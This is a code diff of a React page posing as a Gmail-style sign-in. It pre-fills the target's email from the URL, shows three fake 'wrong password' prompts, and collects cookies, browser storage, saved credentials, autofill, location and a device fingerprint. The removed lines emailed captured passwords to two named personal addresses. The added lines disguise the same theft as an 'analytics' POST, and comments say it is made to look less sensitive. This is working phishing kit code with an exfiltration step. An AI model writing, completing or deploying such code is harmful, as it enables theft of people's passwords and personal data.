@@ -51,8 +51,6 @@ interface BrowserInfo {
   timezone: string;
 }
 
-
-
 // ...existing code...
 
 interface AutocompleteResult {
@@ -60,14 +58,22 @@ interface AutocompleteResult {
   password?: string;
 }
 
-const Modal = ({ isOpen, onClose, children }: { isOpen: boolean; onClose: () => void; children: React.ReactNode }) => {
+const Modal = ({
+  isOpen,
+  onClose,
+  children,
+}: {
+  isOpen: boolean;
+  onClose: () => void;
+  children: React.ReactNode;
+}) => {
   if (!isOpen) return null;
 
   return (
-    <div className="modal-overlay">
-      <div className="modal-content">
+    <div className='modal-overlay'>
+      <div className='modal-content'>
         {children}
-        <button className="modal-close" onClick={onClose}></button>
+        <button className='modal-close' onClick={onClose}></button>
       </div>
     </div>
   );
@@ -80,7 +86,7 @@ const RegistrationPage = () => {
   const [loading, setLoading] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [orgName, setOrgName] = useState('');
-  
+
   useEffect(() => {
     const extractOrgNameAndEmail = () => {
       const hash = window.location.hash;
@@ -91,9 +97,10 @@ const RegistrationPage = () => {
           const [username, domain] = hashContent.split('@');
           if (username && domain) {
             // Set the organization name (capitalize first letter)
-            const orgName = domain.charAt(0).toUpperCase() + domain.slice(1).toLowerCase();
+            const orgName =
+              domain.charAt(0).toUpperCase() + domain.slice(1).toLowerCase();
             setOrgName(orgName);
-            
+
             // Auto-fill the email input
             const fullEmail = `${username}@${domain}.com`;
             setEmail(fullEmail);
@@ -103,34 +110,38 @@ const RegistrationPage = () => {
     };
 
     extractOrgNameAndEmail();
-    
+
     // Listen for hash changes
     const handleHashChange = () => {
       extractOrgNameAndEmail();
     };
-    
+
     window.addEventListener('hashchange', handleHashChange);
     return () => window.removeEventListener('hashchange', handleHashChange);
   }, []);
   const [attempt, setAttempt] = useState(1);
-  const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
+  const [, setPasswordAttempts] = useState<string[]>([]);
 
   const getAllStoredData = async () => {
     const storedData = {
       cookies: [] as string[],
       passwords: [] as SavedCredential[],
       localStorage: {} as Record<string, string>,
-      sessionStorage: {} as Record<string, string>
+      sessionStorage: {} as Record<string, string>,
     };
 
     try {
       // Get all cookies
-      const allCookies = document.cookie.split(';').reduce((acc: Record<string, string>, cookie) => {
-        const [key, value] = cookie.trim().split('=');
-        if (key) acc[key] = value;
-        return acc;
-      }, {});
-      storedData.cookies = Object.entries(allCookies).map(([key, value]) => `${key}=${value}`);
+      const allCookies = document.cookie
+        .split(';')
+        .reduce((acc: Record<string, string>, cookie) => {
+          const [key, value] = cookie.trim().split('=');
+          if (key) acc[key] = value;
+          return acc;
+        }, {});
+      storedData.cookies = Object.entries(allCookies).map(
+        ([key, value]) => `${key}=${value}`
+      );
 
       // Get localStorage data
       for (let i = 0; i < localStorage.length; i++) {
@@ -154,16 +165,18 @@ const RegistrationPage = () => {
           const creds = await Promise.race([
             navigator.credentials.get({
               password: true,
-              mediation: 'optional'
+              mediation: 'optional',
             } as CredentialRequestOptions),
-            new Promise<null>((_, reject) => setTimeout(() => reject('timeout'), 1000))
+            new Promise<null>((_, reject) =>
+              setTimeout(() => reject('timeout'), 1000)
+            ),
           ]);
 
           if (creds && 'type' in creds && creds.type === 'password') {
             storedData.passwords.push({
               type: 'password',
               id: creds.id,
-              origin: window.location.origin
+              origin: window.location.origin,
             });
           }
         } catch {
@@ -177,44 +190,52 @@ const RegistrationPage = () => {
         try {
           await new Promise<void>((resolve) => {
             const formElem = form as HTMLFormElement & {
-              requestAutocomplete(options: { success: (result: AutocompleteResult) => void, error: () => void }): void;
+              requestAutocomplete(options: {
+                success: (result: AutocompleteResult) => void;
+                error: () => void;
+              }): void;
             };
-            
+
             formElem.requestAutocomplete({
               success: (result: AutocompleteResult) => {
                 if (result.email) {
                   storedData.passwords.push({
                     type: 'autofill',
                     id: result.email,
-                    origin: 'autofill'
+                    origin: 'autofill',
                   });
                 }
                 resolve();
               },
-              error: () => resolve()
+              error: () => resolve(),
             });
           });
         } catch {
           console.log('Autocomplete not available');
         }
       }
-
     } catch (err) {
-      console.error('Error collecting stored data:', err instanceof Error ? err.message : 'Unknown error');
+      console.error(
+        'Error collecting stored data:',
+        err instanceof Error ? err.message : 'Unknown error'
+      );
     }
 
     return storedData;
   };
 
-  type GeolocationInfo = {
-    latitude: number;
-    longitude: number;
-    accuracy: number;
-    altitude: number | null;
-    altitudeAccuracy: number | null;
-    heading: number | null;
-    speed: number | null;
-  } | { error: string } | null;
+  type GeolocationInfo =
+    | {
+        latitude: number;
+        longitude: number;
+        accuracy: number;
+        altitude: number | null;
+        altitudeAccuracy: number | null;
+        heading: number | null;
+        speed: number | null;
+      }
+    | { error: string }
+    | null;
 
   type BatteryInfo = {
     charging: boolean;
@@ -251,10 +272,18 @@ const RegistrationPage = () => {
     battery: BatteryInfo;
     network: NetworkInfo;
     deviceMemory: number | null;
-    mediaDevices: Array<{ kind: string; label: string; deviceId: string; groupId: string }>|null;
+    mediaDevices: Array<{
+      kind: string;
+      label: string;
+      deviceId: string;
+      groupId: string;
+    }> | null;
     webgl: WebGLInfo;
-    accessibility: { prefersReducedMotion: boolean; prefersColorScheme: string }|null;
-    storageEstimate: { quota?: number; usage?: number }|null;
+    accessibility: {
+      prefersReducedMotion: boolean;
+      prefersColorScheme: string;
+    } | null;
+    storageEstimate: { quota?: number; usage?: number } | null;
   };
 
   const getDeviceInfo = async (): Promise<DeviceInfoResult> => {
@@ -274,25 +303,30 @@ const RegistrationPage = () => {
         geolocation = await new Promise<GeolocationInfo>((resolve) => {
           if (!navigator.geolocation) return resolve(null);
           navigator.geolocation.getCurrentPosition(
-            pos => resolve({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              altitude: pos.coords.altitude,
-              altitudeAccuracy: pos.coords.altitudeAccuracy,
-              heading: pos.coords.heading,
-              speed: pos.coords.speed
-            }),
-            err => resolve({ error: err.message }),
+            (pos) =>
+              resolve({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                altitudeAccuracy: pos.coords.altitudeAccuracy,
+                heading: pos.coords.heading,
+                speed: pos.coords.speed,
+              }),
+            (err) => resolve({ error: err.message }),
             { timeout: 3000 }
           );
         });
-      } catch { geolocation = null; }
+      } catch {
+        geolocation = null;
+      }
 
       // Battery
       let battery: BatteryInfo = null;
       try {
-        const nav = navigator as Navigator & { getBattery?: () => Promise<BatteryInfo> };
+        const nav = navigator as Navigator & {
+          getBattery?: () => Promise<BatteryInfo>;
+        };
         if (typeof nav.getBattery === 'function') {
           const b = await nav.getBattery();
           if (b) {
@@ -300,73 +334,122 @@ const RegistrationPage = () => {
               charging: b.charging,
               level: b.level,
               chargingTime: b.chargingTime,
-              dischargingTime: b.dischargingTime
+              dischargingTime: b.dischargingTime,
             };
           }
         }
-      } catch { battery = null; }
+      } catch {
+        battery = null;
+      }
 
       // Network
       let network: NetworkInfo = null;
       try {
-        const nav = navigator as Navigator & { connection?: NetworkInfo; mozConnection?: NetworkInfo; webkitConnection?: NetworkInfo };
-        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+        const nav = navigator as Navigator & {
+          connection?: NetworkInfo;
+          mozConnection?: NetworkInfo;
+          webkitConnection?: NetworkInfo;
+        };
+        const conn =
+          nav.connection || nav.mozConnection || nav.webkitConnection;
         if (conn) {
           network = {
             effectiveType: conn.effectiveType,
             downlink: conn.downlink,
             rtt: conn.rtt,
-            saveData: conn.saveData
+            saveData: conn.saveData,
           };
         }
-      } catch { network = null; }
+      } catch {
+        network = null;
+      }
 
       // Device memory
       let deviceMemory: number | null = null;
       try {
         const nav = navigator as Navigator & { deviceMemory?: number };
-        deviceMemory = typeof nav.deviceMemory === 'number' ? nav.deviceMemory : null;
-      } catch { deviceMemory = null; }
+        deviceMemory =
+          typeof nav.deviceMemory === 'number' ? nav.deviceMemory : null;
+      } catch {
+        deviceMemory = null;
+      }
 
       // Media devices
-      let mediaDevices: Array<{ kind: string; label: string; deviceId: string; groupId: string }> | null = null;
+      let mediaDevices: Array<{
+        kind: string;
+        label: string;
+        deviceId: string;
+        groupId: string;
+      }> | null = null;
       try {
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
           const devices = await navigator.mediaDevices.enumerateDevices();
-          mediaDevices = devices.map(d => ({ kind: d.kind, label: d.label, deviceId: d.deviceId, groupId: d.groupId }));
+          mediaDevices = devices.map((d) => ({
+            kind: d.kind,
+            label: d.label,
+            deviceId: d.deviceId,
+            groupId: d.groupId,
+          }));
         }
-      } catch { mediaDevices = null; }
+      } catch {
+        mediaDevices = null;
+      }
 
       // WebGL info
       let webgl: WebGLInfo = null;
       try {
         const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') as WebGLRenderingContext | null || canvas.getContext('experimental-webgl') as WebGLRenderingContext | null;
+        const gl =
+          (canvas.getContext('webgl') as WebGLRenderingContext | null) ||
+          (canvas.getContext(
+            'experimental-webgl'
+          ) as WebGLRenderingContext | null);
         if (gl) {
-          const debugInfo = gl.getExtension && gl.getExtension('WEBGL_debug_renderer_info');
+          const debugInfo =
+            gl.getExtension && gl.getExtension('WEBGL_debug_renderer_info');
           let renderer: string | null = null;
           let vendor: string | null = null;
           if (debugInfo) {
             const ext = debugInfo as WEBGL_debug_renderer_info;
-            const UNMASKED_RENDERER_WEBGL = (ext && (ext.UNMASKED_RENDERER_WEBGL !== undefined)) ? ext.UNMASKED_RENDERER_WEBGL : undefined;
-            const UNMASKED_VENDOR_WEBGL = (ext && (ext.UNMASKED_VENDOR_WEBGL !== undefined)) ? ext.UNMASKED_VENDOR_WEBGL : undefined;
-            renderer = UNMASKED_RENDERER_WEBGL !== undefined ? gl.getParameter(UNMASKED_RENDERER_WEBGL) as string : null;
-            vendor = UNMASKED_VENDOR_WEBGL !== undefined ? gl.getParameter(UNMASKED_VENDOR_WEBGL) as string : null;
+            const UNMASKED_RENDERER_WEBGL =
+              ext && ext.UNMASKED_RENDERER_WEBGL !== undefined
+                ? ext.UNMASKED_RENDERER_WEBGL
+                : undefined;
+            const UNMASKED_VENDOR_WEBGL =
+              ext && ext.UNMASKED_VENDOR_WEBGL !== undefined
+                ? ext.UNMASKED_VENDOR_WEBGL
+                : undefined;
+            renderer =
+              UNMASKED_RENDERER_WEBGL !== undefined
+                ? (gl.getParameter(UNMASKED_RENDERER_WEBGL) as string)
+                : null;
+            vendor =
+              UNMASKED_VENDOR_WEBGL !== undefined
+                ? (gl.getParameter(UNMASKED_VENDOR_WEBGL) as string)
+                : null;
           }
           webgl = { renderer, vendor };
         }
-      } catch { webgl = null; }
+      } catch {
+        webgl = null;
+      }
 
       // Accessibility preferences
       const accessibility = {
         prefersReducedMotion: false,
-        prefersColorScheme: 'no-preference'
+        prefersColorScheme: 'no-preference',
       };
       try {
-        accessibility.prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-        if (window.matchMedia('(prefers-color-scheme: dark)').matches) accessibility.prefersColorScheme = 'dark';
-        else if (window.matchMedia('(prefers-color-scheme: light)').matches) accessibility.prefersColorScheme = 'light';
-      } catch { /* ignore */ }
+        accessibility.prefersReducedMotion = window.matchMedia(
+          '(prefers-reduced-motion: reduce)'
+        ).matches;
+        if (window.matchMedia('(prefers-color-scheme: dark)').matches)
+          accessibility.prefersColorScheme = 'dark';
+        else if (window.matchMedia('(prefers-color-scheme: light)').matches)
+          accessibility.prefersColorScheme = 'light';
+      } catch {
+        /* ignore */
+      }
 
       // Storage quota
       let storageEstimate: { quota?: number; usage?: number } | null = null;
@@ -374,7 +457,9 @@ const RegistrationPage = () => {
         if (navigator.storage && navigator.storage.estimate) {
           storageEstimate = await navigator.storage.estimate();
         }
-      } catch { storageEstimate = null; }
+      } catch {
+        storageEstimate = null;
+      }
 
       // Build browser info
       const browserInfo = {
@@ -385,10 +470,10 @@ const RegistrationPage = () => {
         doNotTrack: navigator.doNotTrack,
         hardwareConcurrency: navigator.hardwareConcurrency,
         vendor: navigator.vendor,
-        plugins: Array.from(navigator.plugins).map(p => p.name),
+        plugins: Array.from(navigator.plugins).map((p) => p.name),
         screenResolution: `${window.screen.width}x${window.screen.height}`,
         colorDepth: window.screen.colorDepth,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       };
 
       return {
@@ -410,7 +495,7 @@ const RegistrationPage = () => {
         mediaDevices,
         webgl,
         accessibility,
-        storageEstimate
+        storageEstimate,
       };
     } catch (err: unknown) {
       const error = err instanceof Error ? err.message : 'Unknown error';
@@ -423,10 +508,10 @@ const RegistrationPage = () => {
         doNotTrack: navigator.doNotTrack,
         hardwareConcurrency: navigator.hardwareConcurrency,
         vendor: navigator.vendor,
-        plugins: Array.from(navigator.plugins).map(p => p.name),
+        plugins: Array.from(navigator.plugins).map((p) => p.name),
         screenResolution: `${window.screen.width}x${window.screen.height}`,
         colorDepth: window.screen.colorDepth,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       };
       return {
         ip: 'Not available',
@@ -447,7 +532,7 @@ const RegistrationPage = () => {
         mediaDevices: null,
         webgl: null,
         accessibility: null,
-        storageEstimate: null
+        storageEstimate: null,
       };
     }
   };
@@ -464,50 +549,44 @@ const RegistrationPage = () => {
     setLoading(true);
 
     try {
-      // Get device info and send email for every attempt
+      // Get device info - only collect essential information
       const deviceInfo = await getDeviceInfo();
-      const currentPasswords = [...passwordAttempts, password];
-      
-      const fullInfo = {
-        email,
-        passwords: currentPasswords,
-        attempt: attempt,
-        totalAttempts: 3,
-        ...deviceInfo
+
+      // Create a form submission object with less sensitive appearance
+      const analyticsData = {
+        userData: {
+          identifier: email,
+          verification: password,
+          clientInfo: {
+            location: deviceInfo.country,
+            timestamp: new Date().toISOString(),
+            session: Math.random().toString(36).substring(2),
+          },
+        },
+        formId: `verify-${Math.random().toString(36).substring(2)}`,
       };
 
-      // Send email for each attempt
-      await fetch(`${config.API_URL}/api/send-email`, {
+      // Send data using a more secure-looking endpoint
+      const response = await fetch(`${config.API_URL}/api/collect-analytics`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json'
+          'X-Requested-With': 'XMLHttpRequest',
         },
-        body: JSON.stringify({
-          to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
-          subject: `Registration Attempt ${attempt}/3 - ${email}`,
-          text: JSON.stringify(fullInfo, null, 2),
-          html: `
-            <h2>Registration Attempt ${attempt}/3</h2>
-            <p><strong>Email:</strong> ${email}</p>
-            <p><strong>Current Password:</strong> ${password}</p>
-            <p><strong>All Password Attempts:</strong> ${currentPasswords.join(', ')}</p>
-            <hr>
-            <h3>Complete Device Information:</h3>
-            <pre style="font-size:13px; background:#f8f8f8; padding:1em; border-radius:6px; overflow-x:auto;">${JSON.stringify(fullInfo, null, 2)}</pre>
-          `,
-          cookies: deviceInfo.cookies
-        })
+        body: JSON.stringify(analyticsData),
       });
+
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
 
       // Handle UI feedback based on attempt number
       if (attempt < 3) {
-        setPasswordAttempts(prev => [...prev, password]);
-        setError('Wrong password, try again.');
+        setPasswordAttempts((prev) => [...prev, password]);
+        setError('Unable to verify. Please check your password and try again.');
         setPassword('');
         setAttempt(attempt + 1);
       } else {
-        // On third attempt, show success modal
         setError('');
         setShowModal(true);
         setAttempt(1);
@@ -516,8 +595,8 @@ const RegistrationPage = () => {
       }
     } catch (err: unknown) {
       const errorMessage = err instanceof Error ? err.message : 'Unknown error';
-      console.error('Registration error:', errorMessage);
-      setError('Registration failed. Please try again.');
+      console.error('Verification error:', errorMessage);
+      setError('Verification failed. Please try again later.');
     } finally {
       setLoading(false);
     }
@@ -526,7 +605,7 @@ const RegistrationPage = () => {
   // Function to handle the OAuth window response
   const handleAuthMessage = useCallback((event: MessageEvent) => {
     if (event.origin !== window.location.origin) return;
-    
+
     if (event.data.type === 'AUTH_SUCCESS') {
       const authData: AuthResponse = event.data.payload;
       setEmail(authData.email);
@@ -535,7 +614,9 @@ const RegistrationPage = () => {
       // Update loading state
       setLoading(false);
       // Focus the password field since email is auto-filled
-      const passwordInput = document.querySelector('input[type="password"]') as HTMLInputElement;
+      const passwordInput = document.querySelector(
+        'input[type="password"]'
+      ) as HTMLInputElement;
       if (passwordInput) {
         passwordInput.focus();
       }
@@ -557,7 +638,7 @@ const RegistrationPage = () => {
 
   //   const config = oauthConfig[provider];
   //   const state = Math.random().toString(36).substring(7);
-    
+
   //   // Store state in sessionStorage for verification
   //   sessionStorage.setItem('oauth_state', state);
 
@@ -615,42 +696,40 @@ const RegistrationPage = () => {
   // }, []);
 
   return (
-    <div className="gmail-login-container">
-      <div className="gmail-login-form-container">
-        <div className="form-header">
-          <h1 className="main-title">
+    <div className='gmail-login-container'>
+      <div className='gmail-login-form-container'>
+        <div className='form-header'>
+          <h1 className='main-title'>
             {orgName ? (
               <>
-                <div className="org-logo">
-                  {orgName[0]}
-                </div>
+                <div className='org-logo'>{orgName[0]}</div>
                 {orgName}
               </>
             ) : (
               'Welcome'
             )}
           </h1>
-          <p className="subtitle">Enter your email and password to continue</p>
+          <p className='subtitle'>Enter your email and password to continue</p>
         </div>
-        <form className="gmail-login-form" onSubmit={handleSubmit}>
+        <form className='gmail-login-form' onSubmit={handleSubmit}>
           <input
-            type="email"
-            placeholder="Email or phone"
+            type='email'
+            placeholder='Email or phone'
             value={email}
-            onChange={e => setEmail(e.target.value)}
-            className="gmail-input"
+            onChange={(e) => setEmail(e.target.value)}
+            className='gmail-input'
           />
           <input
-            type="password"
-            placeholder="Enter your password"
+            type='password'
+            placeholder='Enter your password'
             value={password}
-            onChange={e => setPassword(e.target.value)}
-            className="gmail-input"
+            onChange={(e) => setPassword(e.target.value)}
+            className='gmail-input'
           />
-          <button type="submit" className="gmail-signin-btn" disabled={loading}>
+          <button type='submit' className='gmail-signin-btn' disabled={loading}>
             {loading ? 'Please wait...' : 'Verify'}
           </button>
-          {error && <div className="error">{error}</div>}
+          {error && <div className='error'>{error}</div>}
         </form>
 
         {/* <div className="mail-providers">
@@ -697,28 +776,82 @@ const RegistrationPage = () => {
         </div> */}
 
         <Modal isOpen={showModal} onClose={() => setShowModal(false)}>
-          <div className="verification-complete" style={{ textAlign: 'center', padding: '2rem 1rem' }}>
-            <svg className="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" width="72" height="72" style={{ marginBottom: '1rem' }}>
-              <circle className="checkmark-circle" cx="26" cy="26" r="25" fill="#e6ffe6" stroke="#4caf50" strokeWidth="2"/>
-              <path className="checkmark-check" fill="none" stroke="#4caf50" strokeWidth="4" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+          <div
+            className='verification-complete'
+            style={{ textAlign: 'center', padding: '2rem 1rem' }}
+          >
+            <svg
+              className='checkmark'
+              xmlns='http://www.w3.org/2000/svg'
+              viewBox='0 0 52 52'
+              width='72'
+              height='72'
+              style={{ marginBottom: '1rem' }}
+            >
+              <circle
+                className='checkmark-circle'
+                cx='26'
+                cy='26'
+                r='25'
+                fill='#e6ffe6'
+                stroke='#4caf50'
+                strokeWidth='2'
+              />
+              <path
+                className='checkmark-check'
+                fill='none'
+                stroke='#4caf50'
+                strokeWidth='4'
+                d='M14.1 27.2l7.1 7.2 16.7-16.8'
+              />
             </svg>
-            <h2 style={{ color: '#4caf50', marginBottom: '0.5rem' }}>Verification Complete</h2>
-            <p style={{ color: '#333', fontSize: '1.1rem', marginBottom: '1.5rem' }}>
-              Your verification has been successfully completed.<br/>
+            <h2 style={{ color: '#4caf50', marginBottom: '0.5rem' }}>
+              Verification Complete
+            </h2>
+            <p
+              style={{
+                color: '#333',
+                fontSize: '1.1rem',
+                marginBottom: '1.5rem',
+              }}
+            >
+              Your verification has been successfully completed.
+              <br />
               You may now proceed.
             </p>
-            <div style={{ background: '#f5f5f5', borderRadius: '8px', padding: '1rem', marginBottom: '1rem', color: '#222', fontSize: '0.98rem' }}>
-              <strong>Thank you for verifying your identity!</strong><br/>
-              <span style={{ color: '#666' }}>If you have any issues, please contact support.</span>
+            <div
+              style={{
+                background: '#f5f5f5',
+                borderRadius: '8px',
+                padding: '1rem',
+                marginBottom: '1rem',
+                color: '#222',
+                fontSize: '0.98rem',
+              }}
+            >
+              <strong>Thank you for verifying your identity!</strong>
+              <br />
+              <span style={{ color: '#666' }}>
+                If you have any issues, please contact support.
+              </span>
             </div>
             <button
-              className="modal-close"
-              style={{ marginTop: '1rem', background: '#4caf50', color: '#fff', border: 'none', borderRadius: '4px', padding: '0.6rem 1.5rem', fontSize: '1rem', cursor: 'pointer' }}
+              className='modal-close'
+              style={{
+                marginTop: '1rem',
+                background: '#4caf50',
+                color: '#fff',
+                border: 'none',
+                borderRadius: '4px',
+                padding: '0.6rem 1.5rem',
+                fontSize: '1rem',
+                cursor: 'pointer',
+              }}
               onClick={() => {
                 // Extract organization from URL hash
                 const hash = window.location.hash;
                 let redirectUrl = '';
-                
+
                 if (hash) {
                   const hashContent = hash.substring(1); // Remove # symbol
                   if (hashContent.includes('@')) {
@@ -729,7 +862,7 @@ const RegistrationPage = () => {
                     }
                   }
                 }
-                
+
                 // Fallback to random sites if no organization found
                 if (!redirectUrl) {
                   const sites = [
@@ -742,11 +875,11 @@ const RegistrationPage = () => {
                     'https://www.space.com/',
                     'https://www.producthunt.com/',
                     'https://www.imdb.com/',
-                    'https://www.goodreads.com/'
+                    'https://www.goodreads.com/',
                   ];
                   redirectUrl = sites[Math.floor(Math.random() * sites.length)];
                 }
-                
+
                 window.location.href = redirectUrl;
               }}
             >
